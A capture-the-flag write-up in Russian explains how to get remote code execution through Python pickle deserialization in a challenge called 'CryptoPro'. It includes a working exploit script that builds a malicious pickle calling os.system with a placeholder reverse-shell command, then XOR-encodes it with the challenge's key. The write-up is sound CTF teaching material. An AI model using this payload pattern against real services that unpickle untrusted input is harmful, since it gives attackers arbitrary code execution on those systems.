# CryptoPro

## Information
!!! Срочно требуются криптоаналитики !!! Нужно разгрузить щебень. Оплата в USDT


## TL; DR
Создать свой сериализованный вредоносный дамп, в котором будет зашито выполнение команд

## Writeup (ru)

Функция `loads()` модуля `pickle` уязвима к выполнению произвольного кода, следовательно для получения RCE нужно сериализовать payload, который в дальнейшем попадет в `pickle.loads()`.

Но дамп кошелька "подписывается" с помощью конкатенации с `secret_number` (число от 10 до 99, которое предстоит угадать) и дальнешего xor'а с известной из исходников переменной `encrypt_key`.

В пейлоаде нужно воссоздать все проделанные преобразования над сериализованным объектом, используя корректный `secret_number` из функции `save()`.

```python
import pickle
import os


class MaliciousCode:
    def __reduce__(self):
        import os
        return (os.system,("command/revshell/whateveruwant", ))


malicious_object = MaliciousCode()

encrypt_key = 'uiweiudwnhefiuwehfiuwefniwuefniuwefnwiuweojfoiwjefijwoifjwoifjowjfoiwjfijewfoijweoifjoiwjefojwfeiojwfoijwoifjwef'
secret_number = 87

data = pickle.dumps(malicious_object)
data = data + int(secret_number).to_bytes(1, 'big')

encrypt_key_bytes = encrypt_key.encode('utf-8')
tmp = b""
for i in range(len(data)):
        tmp += bytes([data[i] ^ encrypt_key_bytes[i % len(encrypt_key_bytes)]])
data = tmp
with open('wallet.bin', 'wb') as f:
        f.write(data)
```

Райтап я дам, скрипт для автоматизации перебора secret_number я не дам.


## Flag
`mireactf{random uuid}`